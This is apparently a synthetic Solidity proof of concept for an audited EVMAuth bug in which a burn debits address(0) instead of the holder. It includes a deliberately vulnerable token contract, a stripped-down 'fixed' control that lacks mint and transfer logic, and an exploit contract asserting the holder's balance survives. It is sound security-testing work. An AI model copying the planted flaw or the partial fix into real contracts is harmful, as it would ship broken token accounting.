// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Radius EVMAuth — a burn assigns the account from `to`, which is address(0)
    (Trail of Bits, Radius Technology, October 2025).
    SYNTHETIC, cheatcode-free, one block.
    _update's burn branch sets `_account = to` instead of `from`. The debit
    hits the zero address, reverts, and the holder's balance stays N = 100.
    Control sets the account to the caller and the balance falls to 0. */

contract AuthToken {
    string public constant name = "EVMAuth";
    string public constant symbol = "AUTH";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    uint256 public burned;
    address public debitAccount;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function _burnGroupBalances(address account, uint256 amount) internal {
        require(balanceOf[account] >= amount, "short");
        balanceOf[account] -= amount;
        burned += amount;
    }

    function _pruneGroups(address account) internal {
        account;
    }

    function update(address from, address to, uint256 amount) external {
        if (from == address(0)) {
            balanceOf[to] += amount;
        } else if (to == address(0)) {
            // Burning
            // @> VULN: the burn account is `to` (address(0)), not the holder in `from`
            debitAccount = to;
            _burnGroupBalances(debitAccount, amount);
            _pruneGroups(debitAccount);
        } else {
            require(balanceOf[from] >= amount, "bal");
            balanceOf[from] -= amount;
            balanceOf[to] += amount;
        }
    }
}

contract AuthTokenFixed {
    string public constant name = "EVMAuth";
    string public constant symbol = "AUTH";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    uint256 public burned;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function _burnGroupBalances(address account, uint256 amount) internal {
        require(balanceOf[account] >= amount, "short");
        balanceOf[account] -= amount;
        burned += amount;
    }

    function _pruneGroups(address account) internal {
        account;
    }

    function update(address from, address to, uint256 amount) external {
        if (to == address(0)) {
            // FIX: burn the holder who is ending the subscription, not address(0)
            address _account = from;
            _burnGroupBalances(_account, amount);
            _pruneGroups(_account);
        }
    }
}

contract Exploit {
    AuthToken public token;
    uint256 public kept;
    bool public burnSucceeded;

    constructor() {
        token = new AuthToken();
    }

    function run() external {
        uint256 n = 100 ether;
        token.mint(address(this), n);
        try token.update(address(this), address(0), n) {
            burnSucceeded = true;
        } catch {
            burnSucceeded = false;
        }
        kept = token.balanceOf(address(this));
        require(burnSucceeded == false, "burn reverted");
        require(kept == n, "holder not reduced");
        require(token.burned() == 0, "nothing burned");
    }
}
